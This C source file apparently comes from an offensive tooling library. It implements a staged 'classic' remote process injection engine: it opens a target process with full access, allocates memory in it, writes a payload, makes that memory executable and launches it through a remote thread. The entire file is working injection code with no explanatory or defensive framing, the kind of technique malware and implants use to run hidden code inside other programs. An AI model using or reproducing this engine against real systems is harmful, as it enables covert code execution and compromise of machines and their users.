#include <sindri/common/macros.h>
#include <sindri/injection/classic/engine.h>
#include <sindri/injection/context.h>
#include <sindri/injection/status.h>
#include <sindri/internal/nt/base.h>
#include <sindri/internal/nt/process.h>
#include <sindri/internal/windows/constants.h>

snd_status_t snd_inj_classic_open_target(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->open_process);

    if (ctx->stage != SND_INJ_STAGE_UNINITIALIZED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_UNINITIALIZED), snd_inj_stage_to_string(ctx->stage));
    }

    SND_TRY(ctx->proc_api->open_process(ctx->target_pid, SND_PROCESS_ALL_ACCESS, &ctx->target_process));

    ctx->stage = SND_INJ_STAGE_TARGET_ACQUIRED;
    return SND_OK;
}

snd_status_t snd_inj_classic_alloc_remote(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->alloc_remote);

    if (ctx->stage != SND_INJ_STAGE_TARGET_ACQUIRED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_TARGET_ACQUIRED), snd_inj_stage_to_string(ctx->stage));
    }

    SND_CHECK_NULL(ctx->payload, ctx->payload->data, ctx->payload->size);

    ctx->remote_size = ctx->payload->size;

    SND_TRY(ctx->proc_api->alloc_remote(ctx->target_process, ctx->remote_size, SND_MEM_COMMIT | SND_MEM_RESERVE,
                                        SND_PAGE_READWRITE, &ctx->remote_base));

    ctx->stage = SND_INJ_STAGE_MEMORY_ALLOCATED;
    return SND_OK;
}

snd_status_t snd_inj_classic_write_payload(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->write_remote);

    if (ctx->stage != SND_INJ_STAGE_MEMORY_ALLOCATED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_MEMORY_ALLOCATED),
                           snd_inj_stage_to_string(ctx->stage));
    }

    SIZE_T written = 0;
    SND_TRY(ctx->proc_api->write_remote(ctx->target_process, ctx->remote_base, ctx->payload->data, ctx->remote_size,
                                        &written));

    ctx->stage = SND_INJ_STAGE_PAYLOAD_WRITTEN;
    return SND_OK;
}

snd_status_t snd_inj_classic_set_protections(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->protect_remote);

    if (ctx->stage != SND_INJ_STAGE_PAYLOAD_WRITTEN) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_PAYLOAD_WRITTEN), snd_inj_stage_to_string(ctx->stage));
    }

    DWORD old_protect = 0;
    SND_TRY(ctx->proc_api->protect_remote(ctx->target_process, ctx->remote_base, ctx->remote_size,
                                          SND_PAGE_EXECUTE_READ, &old_protect));

    ctx->stage = SND_INJ_STAGE_PROTECTIONS_SET;
    return SND_OK;
}

snd_status_t snd_inj_classic_execute(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->create_remote_thread);

    if (ctx->stage != SND_INJ_STAGE_PROTECTIONS_SET) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_PROTECTIONS_SET), snd_inj_stage_to_string(ctx->stage));
    }

    PVOID start_address = ctx->remote_entry_point ? ctx->remote_entry_point : ctx->remote_base;
    SND_TRY(
        ctx->proc_api->create_remote_thread(ctx->target_process, start_address, ctx->remote_arg, &ctx->remote_thread));

    ctx->stage = SND_INJ_STAGE_EXECUTED;
    return SND_OK;
}
